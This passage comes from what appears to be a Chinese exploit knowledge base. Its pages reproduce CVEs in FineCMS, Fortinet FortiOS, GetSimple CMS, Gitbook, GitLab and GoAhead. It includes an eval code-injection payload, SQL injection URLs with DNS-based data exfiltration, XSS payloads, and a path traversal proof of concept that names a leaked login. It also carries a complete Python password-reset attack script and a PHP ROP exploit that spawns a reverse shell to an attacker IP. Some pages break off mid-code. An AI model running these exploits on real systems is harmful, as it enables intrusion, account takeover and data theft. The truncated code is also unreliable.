可以看到开头这里验证了认证码： // 安全码认证 $auth = $this->input->get('auth', true); if ($auth != md5(SYS_KEY)) { // 授权认证码不正确 $data = array('msg' => '授权认证码不正确', 'code' => 0); } else { 授权码在/config/system.php 可以看到SYS_KEY是固定的，我们可以在Cookies找到，/finecms/dayrui/config/config.php 用浏览器查看Cookies可以看到KEY，但是验证用MD5，我们先把KEY加密就行了。 直接看到这一段，调用了Template对象里面的list_tag函数 if (!$data) { // list数据查询 $data = $this->template->list_tag($param); $data['code'] = $data['error'] ? 0 : 1; unset($data['sql'], $data['pages']); // 缓存数据 $cache && $this->set_cache_data($cache, $data, $param['cache']); } 我们到finecms/dayrui/libraries/Template.php看list_tag函数的代码,代码有点长，我抓重点的地方,这里把param=action=cache%20name=MEMBER.1%27];phpinfo();$a=[%271的内容分为两个数组$var、$val，这两个数组的内容分别为 $var=['action','name'] $val=['cache%20','MEMBER.1%27];phpinfo();$a=[%271'] $cache=_cache_var是返回会员的信息 重点的是下面的 @eval('$data=$cache'.$this->_get_var($_param).';'); foreach ($params as $t) { $var = substr($t, 0, strpos($t, '=')); $val = substr($t, strpos($t, '=') + 1); 再看这一段,因为swtich选中的是cache，所有就不再进行下面的分析了。 $pos = strpos($param['name'], '.');这句是为下面的substr函数做准备。 是为了分离出的内容为 $_name='MEMBER' $_param=\"1%27];phpinfo();$a=[%271\" // action switch ($system['action']) { case 'cache': // 系统缓存数据 if (!isset($param['name'])) { return $this->_return($system['return'], 'name参数不存在'); } $pos = strpos($param['name'], '.'); if ($pos !== FALSE) { $_name = substr($param['name'], 0, $pos); $_param = substr($param['name'], $pos + 1); } else { $_name = $param['name']; $_param = NULL; } $cache = $this->_cache_var($_name, !$system['site'] ? SITE_ID : $system['site']); if (!$cache) { return $this->_return($system['return'], \"缓存({$_name})不存在，请在后台更新缓存\"); } if ($_param) { $data = array(); @eval('$data=$cache'.$this->_get_var($_param).';'); if (!$data) { return $this->_return($system['return'], \"缓存({$_name})参数不存在!!\"); } } else { $data = $cache; } return $this->_return($system['return'], $data, ''); break; 跟踪get_var函数，在这里我们先把$param的内容假设为a,然后执行函数里面的内容，最后返回的$string的内容是： $string=['a'] 那么我们的思路就是把两边的[' ']闭合然后再放上恶意的代码。 payload为：1'];phpinfo();$a=['1 那么返回的$string的内容： $string=['1'];phpinfo();$a=['1'] public function _get_var($param) { $array = explode('.', $param); if (!$array) { return ''; } $string = ''; foreach ($array as $var) { $string.= '['; if (strpos($var, '$') === 0) { $string.= preg_replace('/\\[(.+)\\]/U', '[\\'\\\\1\\']', $var); } elseif (preg_match('/[A-Z_]+/', $var)) { $string.= ''.$var.''; } else { $string.= '\\''.$var.'\\''; } $string.= ']'; } return $string; } 修复后的_get_var函数里面多了一个dr_safe_replace过滤函数，然后data2()删除了。 public function _get_var($param) { $array = explode('.', $param); if (!$array) { return ''; } $string = ''; foreach ($array as $var) { $var = dr_safe_replace($var); $string.= '['; if (strpos($var, '$') === 0) { $string.= preg_replace('/\\[(.+)\\]/U', '[\\'\\\\1\\']', $var); } elseif (preg_match('/[A-Z_]+/', $var)) { $string.= ''.$var.''; } else { $string.= '\\''.$var.'\\''; } $string.= ']'; } return $string; } dr_safe_replace() function dr_safe_replace($string) { $string = str_replace('%20', '', $string); $string = str_replace('%27', '', $string); $string = str_replace('%2527', '', $string); $string = str_replace('*', '', $string); $string = str_replace('\"', '&quot;', $string); $string = str_replace(\"'\", '', $string); $string = str_replace('\"', '', $string); $string = str_replace(';', '', $string); $string = str_replace('', '&gt;', $string); $string = str_replace(\"{\", '', $string); $string = str_replace('}', '', $string); return $string; } 3、任意sql语句执行1 http://0-sec.org/index.php?c=api&m=data2&auth=582f27d140497a9d8f048ca085b111df&param=action=sql%20sql=%27select%20version();%27 4、任意sql语句执行2 http://0-sec.org/index.php?s=member&c=api&m=checktitle&id=1&title=1&module=news,(select%20(updatexml(1,concat(1,(select%20user()),0x7e),1)))a 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-23 17:50:46 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Finecms/CVE-2018-6893.html":{"url":"0day/Finecms/CVE-2018-6893.html","title":"（CVE-2018-6893）Finecms SQL注入漏洞","keywords":"","body":"（CVE-2018-6893）Finecms SQL注入漏洞 一、漏洞简介 二、漏洞影响 三、复现过程 漏洞位置在： finecms/dayrui/controllers/member/Api.php 590行左右 public function checktitle() { $id = (int)$this->input->get('id'); $title = $this->input->get('title', TRUE); $module = $this->input->get('module'); (!$title || !$module) && exit(''); $num = $this->db->where('id<>', $id)->where('title', $title)->count_all_results(SITE_ID.'_'.$module); $num ? exit(fc_lang(''.fc_lang('重复').'')) : exit(''); } 可以看到方法count_all_results()使用了$module,count_all_results()方法如下： public function count_all_results($table = '', $reset = TRUE) { if ($table !== '') { $this->_track_aliases($table); $this->from($table); } // ORDER BY usage is often problematic here (most notably // on Microsoft SQL Server) and ultimately unnecessary // for selecting COUNT(*) ... if ( ! empty($this->qb_orderby)) { $orderby = $this->qb_orderby; $this->qb_orderby = NULL; } $result = ($this->qb_distinct === TRUE OR ! empty($this->qb_groupby) OR ! empty($this->qb_cache_groupby) OR $this->qb_limit OR $this->qb_offset) ? $this->query($this->_count_string.$this->protect_identifiers('numrows').\"\\nFROM (\\n\".$this->_compile_select().\"\\n) CI_count_all_results\") : $this->query($this->_compile_select($this->_count_string.$this->protect_identifiers('numrows'))); if ($reset === TRUE) { $this->_reset_select(); } // If we've previously reset the qb_orderby values, get them back elseif ( ! isset($this->qb_orderby)) { $this->qb_orderby = $orderby; } if ($result->num_rows() === 0) { return 0; } $row = $result->row(); return (int) $row->numrows; } 可以看到对传入的table参数进行了是否为空校验以及经过两个函数的处理，再跟进_track_aliases函数继续进行分析： protected function _track_aliases($table) { if (is_array($table)) { foreach ($table as $t) { $this->_track_aliases($t); } return; } // Does the string contain a comma? If so, we need to separate // the string into discreet statements if (strpos($table, ',') !== FALSE) { return $this->_track_aliases(explode(',', $table)); } // if a table alias is used we can recognize it by a space if (strpos($table, ' ') !== FALSE) { // if the alias is written with the AS keyword, remove it $table = preg_replace('/\\s+AS\\s+/i', ' ', $table); // Grab the alias $table = trim(strrchr($table, ' ')); // Store the alias, if it doesn't already exist if ( ! in_array($table, $this->qb_aliased_tables, TRUE)) { $this->qb_aliased_tables[] = $table; if ($this->qb_caching === TRUE && ! in_array($table, $this->qb_cache_aliased_tables, TRUE)) { $this->qb_cache_aliased_tables[] = $table; $this->qb_cache_exists[] = 'aliased_tables'; } } } } 可以看到table在这个函数中经过了较多过滤，继续看下一个函数from： public function from($from) { foreach ((array) $from as $val) { if (strpos($val, ',') !== FALSE) { foreach (explode(',', $val) as $v) { $v = trim($v); $this->_track_aliases($v); $this->qb_from[] = $v = $this->protect_identifiers($v, TRUE, NULL, FALSE); if ($this->qb_caching === TRUE) { $this->qb_cache_from[] = $v; $this->qb_cache_exists[] = 'from'; } } } else { $val = trim($val); // Extract any aliases that might exist. We use this information // in the protect_identifiers to know whether to add a table prefix $this->_track_aliases($val); $this->qb_from[] = $val = $this->protect_identifiers($val, TRUE, NULL, FALSE); if ($this->qb_caching === TRUE) { $this->qb_cache_from[] = $val; $this->qb_cache_exists[] = 'from'; } } } return $this; } 可以看到经过这两个函数以及finecms本身get方法的过滤，能用的符号不多了，但是括号以及逗号都还能使用。 在测试的时候，如果传入的参数比如：module=1，则会爆表不存在的错误，并且可以看到查询的语句，而module参数位于from位置，也就是查询的表的位置，于是使用逗号分割查询的表，并使用dns外带数据 payload如下 http://0-sec.org/index.php?s=member&c=api&m=checktitle&id=13&title=123&module=news,(select load_file(concat(0x5c5c5c5c,version(),0x2e6d7973716c2e61687a6935672e636579652e696f5c5c616263)))) as total 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-03 14:47:53 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Finecms/CVE-2018-18191.html":{"url":"0day/Finecms/CVE-2018-18191.html","title":"（CVE-2018-18191）Finecms 5.4 存在CSRF漏洞","keywords":"","body":"（CVE-2018-18191）Finecms 5.4 存在CSRF漏洞 一、漏洞简介 Dayrui FineCms是中国天睿（Dayrui）程序设计团队发布的一套使用MVC架构和PDO数据库接口开发的内容管理系统（CMS）。 Dayrui FineCms 5.4版本中的/admin.php?c=member&m=edit&uid=1存在跨站请求伪造漏洞。远程攻击者可利用该漏洞修改管理员账户密码。 二、漏洞影响 Finecms 5.4 三、复现过程 poc history.pushState('', '', '/') 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-23 17:52:08 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Flash/1.html":{"url":"0day/Flash/1.html","title":"Flash钓鱼源码","keywords":"","body":"Flash 钓鱼源码 https://github.com/ianxtianxt/Flash-player 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-09 21:55:08 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Fortinet FortiOS/CVE-2018-13379.html":{"url":"0day/Fortinet FortiOS/CVE-2018-13379.html","title":"（CVE-2018-13379）Fortinet FortiOS 路径遍历漏洞","keywords":"","body":"（CVE-2018-13379）Fortinet FortiOS 路径遍历漏洞 一、漏洞简介 Fortinet FortiOS路径遍历漏洞（CNNVD-201905-1026、CVE-2018-13379） 漏洞源于该系统未能正确地过滤资源或文件路径中的特殊元素，导致攻击者可以利用该漏洞访问受限目录以外的位置。Fortinet FortiOS 5.6.3版本至5.6.7版本、6.0.0版本至6.0.4版本中的SSL VPN 受此漏洞影响。 二、漏洞影响 Fortinet FortiOS 5.6.3版本至5.6.7版本、 Fortinet FortiOS 6.0.0版本至6.0.4版本 中的SSL VPN 受此漏洞影响。 三、复现过程 POC：http://www.0-sec.org:4443/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession 利用泄露的账户herschel/vvpn123成功登陆。 检测工具 https://github.com/ianxtianxt/CVE-2018-13379 参考链接 https://blog.csdn.net/limb0/article/details/102890683 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-02 16:23:39 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Fortinet FortiOS/CVE-2018-13380.html":{"url":"0day/Fortinet FortiOS/CVE-2018-13380.html","title":"（CVE-2018-13380）Fortinet FortiOS xss漏洞","keywords":"","body":"（CVE-2018-13380）Fortinet FortiOS xss漏洞 一、漏洞简介 Fortinet FortiOS是美国飞塔（Fortinet）公司的一套专用于FortiGate网络安全平台上的安全操作系统。该系统为用户提供防火墙、防病毒、IPSec/SSLVPN、Web内容过滤和反垃圾邮件等多种安全功能。 Fortinet FortiOS 6.0.0版本至6.0.4版本、5.6.0版本至5.6.7版本和5.4及之前版本中的SSL VPN Web门户存在跨站脚本漏洞。该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。 二、漏洞影响 Fortinet Fortios 6.2 Fortinet Fortios 6.0.5 Fortinet Fortios 5.6.8 三、复现过程 http://www.0-sec.org/remote/error?errmsg=ABABAB--%3E%3Cscript%3Ealert(1)%3C/script%3E http://www.0-sec.org/remote/loginredir?redir=6a6176617363726970743a616c65727428646f63756d656e742e646f6d61696e29 http://www.0-sec.org/message?title=x&msg=%26%23; 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-02 16:31:09 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Fortinet FortiOS/CVE-2018-13381.html":{"url":"0day/Fortinet FortiOS/CVE-2018-13381.html","title":"（CVE-2018-13381）Fortinet FortiOS 缓冲区错误漏洞","keywords":"","body":"（CVE-2018-13381）Fortinet FortiOS 缓冲区错误漏洞 一、漏洞简介 Fortinet FortiOS是美国飞塔（Fortinet）公司的一套专用于FortiGate网络安全平台上的安全操作系统。该系统为用户提供防火墙、防病毒、IPSec/SSLVPN、Web内容过滤和反垃圾邮件等多种安全功能。 Fortinet FortiOS 6.0.0版本至6.0.4版本、5.6.0版本至5.6.7版本和5.4及之前版本中存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。 二、漏洞影响 Fortinet Fortios 6.0.5 Fortinet Fortios 5.6.8 三、复现过程 在编码HTML实体代码时，有两个阶段。服务器首先计算编码字符串所需的缓冲区长度，然后将其编码到缓冲区。在计算阶段，例如，字符编码为 ，占用5个字节。如果遇到任何以&#开头的字符，例如，服务器会认为这个token已经被编码了，并直接计算其长度。像这样： c = token[idx]; if (c == '(' || c == ')' || c == '#' || c == '') cnt += 5; else if(c == '&' && html[idx+1] == '#') cnt += len(strchr(html[idx], ';')-idx); 然而，长度计算和编码过程之间将存在不一致，编码部分无法处理这种情况。 switch (c) { case '': // ... default: buf[counter] = c; break; counter++; } 如果我们输入恶意字符串如&#，仍将编码成，所以编码结果应该是&#！这比预期的6个字节长得多，从而导致堆溢出。 PoC： import requests data = { 'title': 'x', 'msg': '&#' + '零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-03 00:20:36 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Fortinet FortiOS/CVE-2018-13382.html":{"url":"0day/Fortinet FortiOS/CVE-2018-13382.html","title":"（CVE-2018-13382）Fortinet FortiOS magic后门","keywords":"","body":"（CVE-2018-13382）Fortinet FortiOS magic后门 一、漏洞简介 Fortinet FortiOS是美国飞塔（Fortinet）公司的一套专用于FortiGate网络安全平台上的安全操作系统。该系统为用户提供防火墙、防病毒、IPSec/SSLVPN、Web内容过滤和反垃圾邮件等多种安全功能。 Fortinet FortiOS 6.0.0版本至6.0.4版本 、5.6.0版本至5.6.8版本和5.4.1版本至5.4.10版本中的SSL VPN Web门户存在授权问题漏洞。该漏洞源于网络系统或产品中缺少身份验证措施或身份验证强度不足。 二、漏洞影响 Fortinet Fortios 6.2 Fortinet Fortios 6.0.5 Fortinet Fortios 5.6.9 Fortinet Fortios 5.4.11 三、复现过程 在登录页面中，我们找到了一个的特殊参数magic。一旦这个参数为某个特殊字符串，我们就可以修改任何用户的密码。 根据我们的调查，仍有大量的Fortigate SSL VPN缺少补丁。因此，考虑到其严重性，我们不会透露magic字符串。但是，CodeWhite的研究人员已经复现了这个漏洞。毫无疑问，其他攻击者很快就会利用此漏洞！请尽快更新您的Fortigate！ Critical vulns in #FortiOS reversed & exploited by our colleagues @niph_ and @ramoliks - patch your #FortiOS asap and see the #bh2019 talk of @orange_8361 and @mehqq_ for details (tnx guys for the teaser that got us started) pic.twitter.com/TLLEbXKnJ4 — Code White GmbH (@codewhitesec) 2019年7月2日 poc https://github.com/ianxtianxt/CVE-2018-13382 $ python CVE-2018-13382.py -h Usage: CVE-2018-13382.py [options] Options: -h, --help show this help message and exit -i IP e.g. 127.0.0.1:10443 -u USERNAME -p PASSWORD import requests, binascii, optparse, sys from urlparse import urlparse from requests.packages.urllib3.exceptions import InsecureRequestWarning requests.packages.urllib3.disable_warnings(InsecureRequestWarning) requests.packages.urllib3.disable_warnings() import multiprocessing import colored from user_agent import generate_user_agent, generate_navigator bold=True userAgent=generate_user_agent() username=\"\" newpassword=\"\" ip=\"\" def setColor(message, bold=False, color=None, onColor=None): from termcolor import colored, cprint retVal = colored(message, color=color, on_color=onColor, attrs=(\"bold\",)) return retVal def checkIP(ip): try: url = \"https://\"+ip+\"/remote/login?lang=en\" headers = {\"User-Agent\": userAgent, \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \"Accept-Language\": \"en-US,en;q=0.5\", \"Accept-Encoding\": \"gzip, deflate\", \"Connection\": \"close\", \"Upgrade-Insecure-Requests\": \"1\"} r=requests.get(url, headers=headers, verify=False) if r.status_code==200 and \"Please Login\" in r.text: return True else: return False except requests.exceptions.ConnectionError as e: print e return False def changePassword(ip,username,newpassword): url = \"https://\"+ip+\"/remote/logincheck\" headers = {\"User-Agent\": userAgent, \"Accept\": \"*/*\", \"Accept-Language\": \"en-US,en;q=0.5\", \"Accept-Encoding\": \"gzip, deflate\", \"Referer\": \"https://\"+ip+\"/remote/login?lang=en\", \"Pragma\": \"no-cache\", \"Cache-Control\": \"no-store, no-cache, must-revalidate\", \"If-Modified-Since\": \"Sat, 1 Jan 2000 00:00:00 GMT\", \"Content-Type\": \"text/plain;charset=UTF-8\", \"Connection\": \"close\"} data = {\"ajax\": \"1\", \"username\": username, \"realm\": '', \"credential\": newpassword, \"magic\": \"4tinet2095866\", \"reqid\": \"0\", \"credential2\": newpassword} r=requests.post(url, headers=headers, data=data, verify=False) if r.status_code==200 and 'redir=/remote/hostcheck_install' in r.text: return True else: return False def testLogin(ip,username,newpassword): url = \"https://\"+ip+\"/remote/logincheck\" headers = {\"User-Agent\": userAgent, \"Accept\": \"*/*\", \"Accept-Language\": \"en-US,en;q=0.5\", \"Accept-Encoding\": \"gzip, deflate\", \"Referer\": \"https://\"+ip+\"/remote/login?lang=en\", \"Pragma\": \"no-cache\", \"Cache-Control\": \"no-store, no-cache, must-revalidate\", \"If-Modified-Since\": \"Sat, 1 Jan 2000 00:00:00 GMT\", \"Content-Type\": \"text/plain;charset=UTF-8\", \"Connection\": \"close\"} data = {\"ajax\": \"1\", \"username\": username, \"realm\": '', \"credential\": newpassword} r=requests.post(url, headers=headers, data=data, verify=False) if r.status_code==200 and\"redir=/remote/hostcheck_install\" in r.text: return True else: return False parser = optparse.OptionParser() parser.add_option('-i', action=\"store\", dest=\"ip\", help=\"e.g. 127.0.0.1:10443\") parser.add_option('-u', action=\"store\", dest=\"username\") parser.add_option('-p', action=\"store\", dest=\"password\") options, remainder = parser.parse_args() if not options.username or not options.password or not options.ip: print \"[!] Please provide the ip (-i), username (-u) and password (-p)\" sys.exit() if options.username: username=options.username if options.password: newpassword=options.password if options.ip: ip=options.ip tmpStatus=checkIP(ip) if tmpStatus==True: print \"[*] Checking if target is a Fortigate device \"+setColor(\" [OK]\", bold, color=\"green\") if changePassword(ip,username,newpassword)==True: print \"[*] Using the magic keyword to change password for: [\"+username+\"]\"+setColor(\" [OK]\", bold, color=\"green\") if testLogin(ip,username,newpassword)==True: print \"[*] Testing new credentials [\"+username+\"|\"+newpassword+\"] \"+setColor(\" [OK]\", bold, color=\"green\") print \"************** Enjoy your new credentials **************\\n\" else: print \"[*] Testing new credentials [\"+username+\"|\"+newpassword+\"] \"+setColor(\" [NOK]\", bold, color=\"red\") else: print \"[*] Using the magic keyword to change password for: [\"+username+\"]\"+setColor(\" [NOK]\", bold, color=\"red\") else: print \"[*] Checking if target is a Fortigate device \"+setColor(\" [NOK]\", bold, color=\"red\") 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-03 00:23:22 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Fortinet FortiOS/CVE-2018-13383.html":{"url":"0day/Fortinet FortiOS/CVE-2018-13383.html","title":"（CVE-2018-13383）Fortinet FortiOS 缓冲区错误漏洞","keywords":"","body":"（CVE-2018-13383）Fortinet FortiOS 缓冲区错误漏洞 一、漏洞简介 Fortinet FortiOS是美国飞塔（Fortinet）公司的一套专用于FortiGate网络安全平台上的安全操作系统。该系统为用户提供防火墙、防病毒、IPSec/SSLVPN、Web内容过滤和反垃圾邮件等多种安全功能。 Fortinet FortiOS 6.2.0之前版本中存在堆缓冲区溢出漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。 二、漏洞影响 Fortinet Fortios 6.2 Fortinet Fortios 6.0.5 三、复现过程 这是WebVPN功能的漏洞。在解析HTML中的JavaScript时，它会尝试使用以下代码将内容复制到缓冲区中： memcpy(buffer, js_buf, js_buf_len); 缓冲区大小固定为0x2000，但输入字符串是无限制的。因此，这里存在堆溢出。值得注意的是，此漏洞可以溢出Null字节，这在我们的利用中很有用。 为触发此溢出，我们需要将exploit放到HTTP服务器上，然后以普通用户权限登录SSL VPN代理访问我们的exploit为普通用户。 这里我们用PHP编写的PoC放在HTTP服务器上: //请自行修改里面的ip以及所需要的执行的命令 > 32 & 0xffffffff; return pack(\"II\", $low, $high); } $junk = 0x4141414141414141; $nop_func = 0x32FC078; $gadget = p64($junk); $gadget .= p64($nop_func - 0x60); $gadget .= p64($junk); $gadget .= p64(0x110FA1A); // # start here # pop r13 ; pop r14 ; pop rbp ; ret ; $gadget .= p64($junk); $gadget .= p64($junk); $gadget .= p64(0x110fa15); // push rbx ; or byte [rbx+0x41], bl ; pop rsp ; pop r13 ; pop r14 ; pop rbp ; ret ; $gadget .= p64(0x1bed1f6); // pop rax ; ret ; $gadget .= p64(0x58); $gadget .= p64(0x04410f6); // add rdi, rax ; mov eax, dword [rdi] ; ret ; $gadget .= p64(0x1366639); // call system ; $gadget .= \"python -c 'import socket,sys,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((sys.argv[1],12345));[os.dup2(s.fileno(),x) for x in range(3)];os.system(sys.argv[2]);' xx.xxx.xx.xx /bin/sh;\"; $p = str_repeat('AAAAAAAA', 1024+512-4); // offset $p .= $gadget; $p .= str_repeat('A', 0x1000 - strlen($gadget)); $p .= $gadget; ?> \">xxx 这个PoC可以分为三个部分。 1.虚假的SSL structure SSL structure和我们的缓冲区相靠，因此我们可以精确伪造。为了避免崩溃，我们将method设置为一个包含空函数指针的位置。此时的参数是 SSL structure本身s。但是，method前面只有8个字节，我们不能简单地调用system(\"/bin/sh\");，这对于我们的反向shell来说是不够的。不过由于那个巨大的二进制文件，我们很容易找到ROP小片段。我们发现一个有用的堆栈枢轴: push rbx ; or byte [rbx+0x41], bl ; pop rsp ; pop r13 ; pop r14 ; pop rbp ; ret ; 因此，我们将handshake_func设置为这个小片段，将rsp移动到SSL structure中，进行下一步的ROP攻击。 2.ROP链 这里的ROP链很简单。我们稍微向前移动rdi，以便有足够的空间执行反向shell命令。 3.溢出的字符串 最后，我们连接溢出填充并加以利用。一旦我们溢出了SSL structure，就会得到一个shell。 最终稳定利用还需要多次尝试，因为有时程序会提前崩溃。但无论如何，攻击还是奏效了，只需要1~2分钟，就可以获得一个反向shell。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-03 00:36:46 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/GetSimple CMS/1.html":{"url":"0day/GetSimple CMS/1.html","title":"（CVE-2019-11231）GetSimple CMS远程命令执行","keywords":"","body":"（CVE-2019-11231）GetSimple CMS 远程命令执行 一、漏洞简介 在GetSimple 3.3.15版本中，攻击者可以通过伪造管理员cookie，绕过身份验证登陆后台，进而通过后台编辑模板功能模块写入php代码，造成远程代码执行漏洞。 二、漏洞影响 GetSimple 三、复现过程 漏洞分析 在分析该漏洞前，不得不提.htaccess文件，本次漏洞的产生，是因为默认情况下apache对.htaccess配置文件的开启情况不同而产生的。 htaccess文件是Apache服务器中的配置文件，它负责相关目录下的网页配置。通过配置htaccess文件，可以实现众多功能，例如：允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等。 启用.htaccess，需要在apache配置文件中，启用AllowOverride。 在笔者测试了两款环境，分别为配置了wamp的windows与ubuntu服务器，在这两个环境中，默认情况对htaccess文件的启用情况是不同的。 先来看安装有wamp的windows环境，打开apahce配置文件httpd.conf 可以看到，这里将位于conf/extra/httpd-vhosts.conf文件导入 跟进 httpd-vhosts.conf文件 可以看到，在这里，默认情况下 AllowOverride 默认值是All 当AllowOverride指令设置为 All时，所有具有”.htaccess”作用域的指令都允许出现在.htaccess文件中。 此时，目录中的.htaccess配置文件为启用状态 例如位于getsimplecms/data目录中的.htaccess配置文件 当此.htaccess配置文件被加载时，是禁止该目录被web端访问的 也就是说，通过该方法，通过web端访问data目录时，不会显示其中文件列表 与其中文件内容，是可以很好的保护存在于该目录下的文件，不被泄露 但是在笔者的ubuntu服务器，ubuntu apache2.conf中 AllowOverride 默认值是None，默认的情况下，不加载目录中的.htaccess 我们将上述的.htaccess文件放入ubuntu服务器的web目录中 再通过浏览器访问这个路径 如上图可见，.htaccess并没有生效，而路径中的文件，是可以被泄露的 回归到本次漏洞： 访问http://127.0.0.1/getsimplecms/data/users/admin.xml 在.htaccess没有生效的情况下，我们获取admin.xml中记录的用户相关信息，该cms并没有将用户信息写入数据库，而是全部存于该文件中 访问http://127.0.0.1/getsimplecms/data/other/authorization.xml获取authorization.xml中记录的apikey 现在我们得到如下的信息：（用户名/加密后的密码/apikey） 该cms并没有将用户信息写入数据库，而是全部存于xml文件中 通过获取的信息，接下来进一步分析如何利用这些泄露的信息： Cookie算法分析： 分析下GetSimple中的cookie是如何生成的 位于\\GetSimpleCMS\\admin\\inc\\cookie_functions.php create_cookie方法 计算cookie所需的$USR $SALT 对应如下： GetSimpleCMS\\data\\users\\admin.xml文件 getsimplecms\\data\\other\\authorization.xml 这些信息是可以直接读取出来的 getsimplecms 中Cookie的算法的实现如下: 算法相对简单，通过$SALT值与$USR进行拼接；$SALT值与$cookie_name拼接，最终通过sha1进行加密，算出对应的cookie键值对 通过泄露的文件与cookie算法，可以顺利计算出对应用户的cookie 现在，可以伪造任意成员的cookie了 以USR :admin举例说明： 最终拼接的cookie为： GS_ADMIN_USERNAME=admin;48fd5258d478eec2a8f417f358c767c992f01b51=8ce411833fcfaedf4fcf5390132a153c00e0482c Password算法分析： 分析下Password的计算方式 Password的加密，是通过passhash()方法来实现的 GSLOGINSALT是用来保护的密码的额外的salt值，默认情况为空。 所以这里的密码计算就比较直接了，通过sha1方法对明文密码进行加密 sha1($p) 通过sha1 hash将明文密码加密为密文。 也就是说，只要获取了加密后的password，有一定几率，可以破解为明文： 获取到管理员cookie/password后，使用管理员账号登陆后台 通过伪造cookie访问后台： 未登录时，访问后台地址 此时需要填写正确的用户名密码才可以登陆后台 这里，通过改包的方式，将cookie修改为之前计算出的值 此时，无需登陆，直接进入后台 访问如下url http://127.0.0.1/getsimplecms/admin/theme-edit.php 在这里可以对模板文件进行编辑，在这里可以写入任意php代码，造成远程代码执行漏洞 例如： 访问如下地址： http://127.0.0.1/getsimplecms/theme/Innovation/template.php 插入的php代码被成功执行 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-27 00:07:01 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Gitbook/CVE-2017-15688.html":{"url":"0day/Gitbook/CVE-2017-15688.html","title":"（CVE-2017-15688）Gitbook任意文件读取","keywords":"","body":"（CVE-2017-15688）Gitbook 任意文件读取 一、漏洞简介 二、漏洞影响 三、复现过程 创建一个md文件，代码用以下 ln -s /etc/passwd ./passwd.md 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-25 15:11:50 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Gitlab/1.html":{"url":"0day/Gitlab/1.html","title":"Gitlab wiki 储存型xss","keywords":"","body":"Gitlab wiki 储存型xss 一、漏洞简介 二、漏洞影响 三、复现过程 1、登录到GitLab。 2、打开有权编辑Wiki页面的’Project’。 3、打开Wiki页面。 4、点击’New page’。 5、用’javascript:’填写’Page slug’表单。 6、点击’Createpage’。 7、填写每个表格： Title: javascript: Format:Markdown Content: [XSS](.alert(1);) 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-13 12:28:34 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/GoAhead/CVE-2019-5096.html":{"url":"0day/GoAhead/CVE-2019-5096.html","title":" （CVE-2019-5096） 远程代码溢出漏洞 ","keywords":"","body":"（CVE-2019-5096） 远程代码溢出漏洞 一、漏洞简介 GoAhead Web服务器最近被曝光在版本v5.0.1，v.4.1.1和v3.6.5中存在一个可利用的代码执行漏洞，漏洞存在http请求的multi-part/form-data字段处理中，若是发送畸形的HTTP请求，可导致GoAhead Web服务器在处理此请求期间触发double-free漏洞。 该畸形请求可以未经身份验证的GET或POST请求形式发送，并且请求的服务器上不需要存在web页面。 二、漏洞影响 v5.0.1，v.4.1.1和v3.6.5 三、复现过程 漏洞分析 漏洞曝光者给出了触发漏洞的源码： / src/upload.c / 66 static void freeUploadFile(WebsUpload *up) 67 { 68 if (up) { 69 if (up->filename) { // BUG: First UAF here 70 unlink(up->filename); // BUG: UAF/unlink - probably not a good idea 71 wfree(up->filename); // BUG: Double free here 72 } 73 74 wfree(up->clientFilename); 75 wfree(up->contentType); 76 wfree(up); 77 } 78 } 